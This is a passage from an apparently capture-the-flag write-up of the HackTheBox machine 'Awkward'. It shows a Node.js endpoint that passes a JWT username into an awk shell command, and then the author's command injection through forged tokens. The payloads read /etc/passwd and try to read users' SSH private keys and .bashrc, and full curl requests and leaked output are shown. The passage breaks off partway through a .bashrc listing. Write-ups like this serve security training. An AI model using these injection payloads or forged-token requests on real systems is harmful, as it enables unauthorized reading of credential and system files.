<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (user_token) {</span></span>
<span class="line"><span style="color:#F97583">        const</span><span style="color:#79B8FF"> decodedToken</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> jwt.</span><span style="color:#B392F0">verify</span><span style="color:#E1E4E8">(user_token, </span><span style="color:#79B8FF">TOKEN_SECRET</span><span style="color:#E1E4E8">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">decodedToken.username) {</span></span>
<span class="line"><span style="color:#E1E4E8">            authFailed </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">        } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
<span class="line"><span style="color:#E1E4E8">            user </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> decodedToken.username;</span></span>
<span class="line"><span style="color:#E1E4E8">        }</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (authFailed) {</span></span>
<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> res.</span><span style="color:#B392F0">status</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">401</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">json</span><span style="color:#E1E4E8">({ Error: </span><span style="color:#9ECBFF">&#39;Invalid Token&#39;</span><span style="color:#E1E4E8"> });</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">user) {</span></span>
<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> res.</span><span style="color:#B392F0">status</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">500</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&#39;Invalid user&#39;</span><span style="color:#E1E4E8">);</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">    const</span><span style="color:#79B8FF"> bad</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> [</span></span>
<span class="line"><span style="color:#9ECBFF">        &#39;;&#39;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">        &#39;&amp;&#39;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">        &#39;|&#39;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">        &#39;&gt;&#39;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">        &#39;&lt;&#39;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">        &#39;*&#39;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">        &#39;?&#39;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">        &#39;`&#39;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">        &#39;$&#39;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">        &#39;(&#39;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">        &#39;)&#39;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">        &#39;{&#39;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">        &#39;}&#39;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">        &#39;[&#39;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">        &#39;]&#39;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">        &#39;!&#39;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">        &#39;#&#39;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#E1E4E8">    ];</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">    const</span><span style="color:#79B8FF"> badInUser</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> bad.</span><span style="color:#B392F0">some</span><span style="color:#E1E4E8">((</span><span style="color:#FFAB70">char</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=&gt;</span><span style="color:#E1E4E8"> user.</span><span style="color:#B392F0">includes</span><span style="color:#E1E4E8">(char));</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (badInUser) {</span></span>
<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> res.</span><span style="color:#B392F0">status</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">500</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&#39;Bad character detected.&#39;</span><span style="color:#E1E4E8">);</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">    exec</span><span style="color:#E1E4E8">(</span></span>
<span class="line"><span style="color:#9ECBFF">        &quot;awk &#39;/&quot;</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> user </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> &quot;/&#39; /var/www/private/leave_requests.csv&quot;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#E1E4E8">        { encoding: </span><span style="color:#9ECBFF">&#39;binary&#39;</span><span style="color:#E1E4E8">, maxBuffer: </span><span style="color:#79B8FF">51200000</span><span style="color:#E1E4E8"> },</span></span>
<span class="line"><span style="color:#E1E4E8">        (</span><span style="color:#FFAB70">error</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">stdout</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">stderr</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=&gt;</span><span style="color:#E1E4E8"> {</span></span>
<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (stdout) {</span></span>
<span class="line"><span style="color:#F97583">                return</span><span style="color:#E1E4E8"> res.</span><span style="color:#B392F0">status</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">new</span><span style="color:#B392F0"> Buffer</span><span style="color:#E1E4E8">(stdout, </span><span style="color:#9ECBFF">&#39;binary&#39;</span><span style="color:#E1E4E8">));</span></span>
<span class="line"><span style="color:#E1E4E8">            }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (error) {</span></span>
<span class="line"><span style="color:#F97583">                return</span><span style="color:#E1E4E8"> res</span></span>
<span class="line"><span style="color:#E1E4E8">                    .</span><span style="color:#B392F0">status</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">500</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#E1E4E8">                    .</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&#39;Failed to retrieve leave requests&#39;</span><span style="color:#E1E4E8">);</span></span>
<span class="line"><span style="color:#E1E4E8">            }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (stderr) {</span></span>
<span class="line"><span style="color:#F97583">                return</span><span style="color:#E1E4E8"> res</span></span>
<span class="line"><span style="color:#E1E4E8">                    .</span><span style="color:#B392F0">status</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">500</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#E1E4E8">                    .</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&#39;Failed to retrieve leave requests&#39;</span><span style="color:#E1E4E8">);</span></span>
<span class="line"><span style="color:#E1E4E8">            }</span></span>
<span class="line"><span style="color:#E1E4E8">        }</span></span>
<span class="line"><span style="color:#E1E4E8">    );</span></span>
<span class="line"><span style="color:#E1E4E8">});</span></span></code></pre>
<p>The <code>AWK command</code> passing the user variable which has the decoded <code>JWT token username</code> value which we can change anything we want</p>
<p>Because we have the JWT token secret, and we can create the token with any <code>username</code> or any <code>fields</code> we want</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">user </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> decodedToken.username </span><span style="color:#F97583">&lt;-----</span><span style="color:#F97583"> using</span><span style="color:#79B8FF"> the</span><span style="color:#E1E4E8"> jwt token username</span></span>
<span class="line"><span style="color:#B392F0">exec</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;awk &#39;/&quot;</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> user </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> &quot;/&#39; /var/www/private/leave_requests.csv&quot;</span><span style="color:#E1E4E8">, {encoding: </span><span style="color:#9ECBFF">&#39;binary&#39;</span><span style="color:#E1E4E8">, maxBuffer: </span><span style="color:#79B8FF">51200000</span><span style="color:#E1E4E8">} </span><span style="color:#F97583">&lt;-----</span><span style="color:#E1E4E8"> we can bypass </span><span style="color:#79B8FF">this</span><span style="color:#E1E4E8"> awk command</span></span></code></pre>
<p>If we pass this as username <code>/&#39; /etc/passwd &#39;</code> we got our desired output</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">user </span><span style="color:#F97583">=</span><span style="color:#F97583"> /</span><span style="color:#9ECBFF">&#39; /etc/passwd &#39;</span><span style="color:#F97583"> &lt;------</span><span style="color:#E1E4E8"> our input</span></span>
<span class="line"><span style="color:#B392F0">exec</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;awk &#39;/&quot;</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> user </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> &quot;/&#39; /var/www/private/leave_requests.csv&quot;</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">&lt;-----</span><span style="color:#E1E4E8"> process query</span></span>
<span class="line"><span style="color:#B392F0">exec</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;awk &#39;//&#39; /etc/passwd &#39;/&#39; /var/www/private/leave_requests.csv&quot;</span><span style="color:#E1E4E8">, {encoding: </span><span style="color:#9ECBFF">&#39;binary&#39;</span><span style="color:#E1E4E8">, maxBuffer: </span><span style="color:#79B8FF">51200000</span><span style="color:#E1E4E8">} </span><span style="color:#F97583">&lt;-----</span><span style="color:#79B8FF"> this</span><span style="color:#E1E4E8"> is how query looks like when executing</span></span></code></pre>
<p>And we can try this in our own <code>machine</code> as shown in the <code>picture</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/cmd2.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>Let’s go to <code>jwt.io</code> and generate the custom <code>username</code> token</p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web16.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>And we got the <code>/etc/passwd</code> file</p>
<ul>
<li>We got the 2 users
<ul>
<li>Bean</li>
<li>Christine</li>
</ul>
</li>
</ul>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">❯ curl </span><span style="color:#B392F0">http</span><span style="color:#E1E4E8">:</span><span style="color:#6A737D">//hat-valley.htb/api/all-leave --header &quot;Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2NjcwMTcxNTd9.HKWzL6o9CamyDt0S-bxQyrKYEqQha_tDr1SfgSLcX7s&quot; | grep -i /bin/bash</span></span>
<span class="line"><span style="color:#F97583">  %</span><span style="color:#E1E4E8"> Total    </span><span style="color:#F97583">%</span><span style="color:#E1E4E8"> Received </span><span style="color:#F97583">%</span><span style="color:#E1E4E8"> Xferd  Average Speed   Time    Time     Time  Current</span></span>
<span class="line"><span style="color:#E1E4E8">                                 Dload  Upload   Total   Spent    Left  Speed</span></span>
<span class="line"><span style="color:#79B8FF">100</span><span style="color:#79B8FF">  3059</span><span style="color:#79B8FF">  100</span><span style="color:#79B8FF">  3059</span><span style="color:#79B8FF">    0</span><span style="color:#79B8FF">     0</span><span style="color:#79B8FF">  13891</span><span style="color:#79B8FF">      0</span><span style="color:#F97583"> --</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">--</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">--</span><span style="color:#F97583"> --</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">--</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">--</span><span style="color:#F97583"> --</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">--</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">--</span><span style="color:#79B8FF"> 13904</span></span>
<span class="line"><span style="color:#B392F0">root</span><span style="color:#E1E4E8">:</span><span style="color:#B392F0">x</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">:</span><span style="color:#B392F0">root</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">/</span><span style="color:#B392F0">root</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bin</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bash</span></span>
<span class="line"><span style="color:#B392F0">bean</span><span style="color:#E1E4E8">:</span><span style="color:#B392F0">x</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1001</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1001</span><span style="color:#E1E4E8">:,,,:</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">home</span><span style="color:#F97583">/</span><span style="color:#B392F0">bean</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bin</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bash</span></span>
<span class="line"><span style="color:#B392F0">christine</span><span style="color:#E1E4E8">:</span><span style="color:#B392F0">x</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1002</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1002</span><span style="color:#E1E4E8">:,,,:</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">home</span><span style="color:#F97583">/</span><span style="color:#B392F0">christine</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bin</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bash</span></span></code></pre>
<p>Let’s check the <code>christine</code> ssh key</p>
<p>Username field <code>look</code> like this</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">{</span></span>
<span class="line"><span style="color:#9ECBFF">  &quot;username&quot;</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">&quot;/&#39; /home/christine/.ssh/id_rsa &#39;&quot;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">  &quot;iat&quot;</span><span style="color:#E1E4E8">: </span><span style="color:#79B8FF">1667017157</span></span>
<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
<p>But we got no <code>luck</code></p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">❯ curl </span><span style="color:#B392F0">http</span><span style="color:#E1E4E8">:</span><span style="color:#6A737D">//hat-valley.htb/api/all-leave --header &quot;Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2NocmlzdGluZS8uc3NoL2lkX3JzYSAnIiwiaWF0IjoxNjY3MDE3MTU3fQ.XIIB2-j3-Pxlwv9EHCfK1-GZ_y2qSt49JVJcZJYgcBY&quot;</span></span>
<span class="line"><span style="color:#E1E4E8">Failed to retrieve leave requests⏎</span></span></code></pre>
<p>Let’s check the <code>bean</code> user ssh key</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">{</span></span>
<span class="line"><span style="color:#9ECBFF">  &quot;username&quot;</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">&quot;/&#39; /home/bean/.ssh/id_rsa &#39;&quot;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">  &quot;iat&quot;</span><span style="color:#E1E4E8">: </span><span style="color:#79B8FF">1667017157</span></span>
<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
<p>Still no <code>luck</code></p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">curl </span><span style="color:#B392F0">http</span><span style="color:#E1E4E8">:</span><span style="color:#6A737D">//hat-valley.htb/api/all-leave --header &quot;Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLnNzaC9pZF9yc2EgJyIsImlhdCI6MTY2NzAxNzE1N30.FwkQWpMsa_0zo2wJffpmJzD9qRYkF-_ESnFRlTDenRw&quot;</span></span>
<span class="line"><span style="color:#E1E4E8">Failed to retrieve leave requests⏎</span></span></code></pre>
<p>Then I try to check the <code>.bashrc</code> file of <code>bean</code> user</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">{</span></span>
<span class="line"><span style="color:#9ECBFF">  &quot;username&quot;</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">&quot;/&#39; /home/bean/.bashrc &#39;&quot;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">  &quot;iat&quot;</span><span style="color:#E1E4E8">: </span><span style="color:#79B8FF">1667017157</span></span>
<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
<p>And this <code>time</code> it’s works</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">❯ curl </span><span style="color:#B392F0">http</span><span style="color:#E1E4E8">:</span><span style="color:#6A737D">//hat-valley.htb/api/all-leave --header &quot;Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjY3MDE3MTU3fQ._Rmh6a1R5H3g8JBg0hZg19LibMyWC93ArEm6wsepCsY&quot;</span></span>
<span class="line"><span style="color:#E1E4E8"># </span><span style="color:#F97583">~/</span><span style="color:#E1E4E8">.bashrc: executed by </span><span style="color:#B392F0">bash</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">) for non</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">login shells.</span></span>
<span class="line"><span style="color:#E1E4E8"># see </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">usr</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">share</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">doc</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bash</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">examples</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">startup</span><span style="color:#F97583">-</span><span style="color:#B392F0">files</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> the package bash</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">doc)</span></span>
<span class="line"><span style="color:#E1E4E8"># for examples</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8"># If not running interactively, don</span><span style="color:#9ECBFF">&#39;t do anythin</span><span style="color:#FDAEB7;font-style:italic">g</span></span>
<span class="line"><span style="color:#F97583">case</span><span style="color:#E1E4E8"> $</span><span style="color:#F97583">-</span><span style="color:#F97583"> in</span></span>
<span class="line"><span style="color:#F97583">    *</span><span style="color:#E1E4E8">i</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">) ;;</span></span>
<span class="line"><span style="color:#F97583">      *</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">return</span><span style="color:#E1E4E8">;;</span></span>
<span class="line"><span style="color:#E1E4E8">esac</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8"># don</span><span style="color:#9ECBFF">&#39;t put duplicate lines or lines starting with space in the history</span><span style="color:#FDAEB7;font-style:italic">.</span></span>
<span class="line"><span style="color:#E1E4E8"># See </span><span style="color:#B392F0">bash</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">) for more options</span></span>
<span class="line"><span style="color:#79B8FF">HISTCONTROL</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">ignoreboth</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8"># append to the history file, don</span><span style="color:#9ECBFF">&#39;t overwrite i</span><span style="color:#FDAEB7;font-style:italic">t</span></span>
<span class="line"><span style="color:#E1E4E8">shopt </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">s histappend</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8"># for setting history length see </span><span style="color:#79B8FF">HISTSIZE</span><span style="color:#E1E4E8"> and </span><span style="color:#79B8FF">HISTFILESIZE</span><span style="color:#F97583"> in</span><span style="color:#B392F0"> bash</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#79B8FF">HISTSIZE</span><span style="color:#F97583">=</span><span style="color:#79B8FF">1000</span></span>
<span class="line"><span style="color:#79B8FF">HISTFILESIZE</span><span style="color:#F97583">=</span><span style="color:#79B8FF">2000</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8"># check the window size after each command and, </span><span style="color:#F97583">if</span><span style="color:#E1E4E8"> necessary,</span></span>
<span class="line"><span style="color:#E1E4E8"># update the values </span><span style="color:#F97583">of</span><span style="color:#79B8FF"> LINES</span><span style="color:#E1E4E8"> and </span><span style="color:#79B8FF">COLUMNS</span><span style="color:#E1E4E8">.</span></span>
<span class="line"><span style="color:#E1E4E8">shopt </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">s checkwinsize</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8"># If set, the pattern </span><span style="color:#9ECBFF">&quot;**&quot;</span><span style="color:#E1E4E8"> used </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> a pathname expansion context will</span></span>
<span class="line"><span style="color:#E1E4E8"># match all files and zero or more directories and subdirectories.</span></span>
<span class="line"><span style="color:#E1E4E8">#shopt </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">s globstar</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8"># make less more friendly for non</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">text input files, see </span><span style="color:#B392F0">lesspipe</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#E1E4E8">[ </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">usr</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bin</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">lesspipe ] </span><span style="color:#F97583">&amp;&amp;</span><span style="color:#E1E4E8"> eval </span><span style="color:#9ECBFF">&quot;$(SHELL=/bin/sh lesspipe)&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8"># set variable identifying the chroot you work </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> (used </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> the prompt below)</span></span>
<span class="line"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> [ </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">z </span><span style="color:#9ECBFF">&quot;${debian_chroot:-}&quot;</span><span style="color:#E1E4E8"> ] </span><span style="color:#F97583">&amp;&amp;</span><span style="color:#E1E4E8"> [ </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">r </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">etc</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">debian_chroot ]; then</span></span>
<span class="line"><span style="color:#E1E4E8">    debian_chroot</span><span style="color:#F97583">=</span><span style="color:#B392F0">$</span><span style="color:#E1E4E8">(cat </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">etc</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">debian_chroot)</span></span>
<span class="line"><span style="color:#E1E4E8">fi</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8"># set a fancy </span><span style="color:#B392F0">prompt</span><span style="color:#E1E4E8"> (non</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">color, unless we know we </span><span style="color:#9ECBFF">&quot;want&quot;</span><span style="color:#E1E4E8"> color)</span></span>
<span class="line"><span style="color:#F97583">case</span><span style="color:#9ECBFF"> &quot;$TERM&quot;</span><span style="color:#F97583"> in</span></span>
<span class="line"><span style="color:#E1E4E8">    xterm</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">color</span><span style="color:#F97583">|*-</span><span style="color:#E1E4E8">256color) color_prompt</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">yes;;</span></span>
<span class="line"><span style="color:#E1E4E8">esac</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8"># uncomment for a colored prompt, </span><span style="color:#F97583">if</span><span style="color:#E1E4E8"> the terminal has the capability; turned</span></span>
<span class="line"><span style="color:#E1E4E8"># off by </span><span style="color:#F97583">default</span><span style="color:#E1E4E8"> to not distract the </span><span style="color:#B392F0">user</span><span style="color:#E1E4E8">: the focus </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> a terminal window</span></span>
<span class="line"><span style="color:#E1E4E8"># should be on the output </span><span style="color:#F97583">of</span><span style="color:#E1E4E8"> commands, not on the prompt</span></span>
<span class="line"><span style="color:#E1E4E8">#force_color_prompt</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">yes</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> [ </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">n </span><span style="color:#9ECBFF">&quot;$force_color_prompt&quot;</span><span style="color:#E1E4E8"> ]; then</span></span>
<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> [ </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">usr</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bin</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">tput ] </span><span style="color:#F97583">&amp;&amp;</span><span style="color:#E1E4E8"> tput setaf </span><span style="color:#79B8FF">1</span><span style="color:#F97583"> &gt;&amp;/</span><span style="color:#E1E4E8">dev</span><span style="color:#F97583">/</span><span style="color:#79B8FF">null</span><span style="color:#E1E4E8">; then</span></span>
<span class="line"><span style="color:#E1E4E8">	# We have color support; assume it</span><span style="color:#9ECBFF">&#39;s compliant with Ecma-4</span><span style="color:#FDAEB7;font-style:italic">8</span></span>
<span class="line"><span style="color:#E1E4E8">	# (</span><span style="color:#79B8FF">ISO</span><span style="color:#F97583">/</span><span style="color:#79B8FF">IEC</span><span style="color:#F97583">-</span><span style="color:#79B8FF">6429</span><span style="color:#E1E4E8">). (Lack </span><span style="color:#F97583">of</span><span style="color:#E1E4E8"> such support is extremely rare, and such</span></span>
<span class="line"><span style="color:#E1E4E8">	# a case would tend to support setf rather than setaf.)</span></span>
<span class="line"><span style="color:#E1E4E8">	color_prompt</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">yes</span></span>
<span class="line"><span style="color:#F97583">    else</span></span>
<span class="line"><span style="color:#E1E4E8">	color_prompt</span><span style="color:#F97583">=</span></span>
<span class="line"><span style="color:#E1E4E8">    fi</span></span>
<span class="line"><span style="color:#E1E4E8">fi</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> [ </span><span style="color:#9ECBFF">&quot;$color_prompt&quot;</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> yes ]; then</span></span>
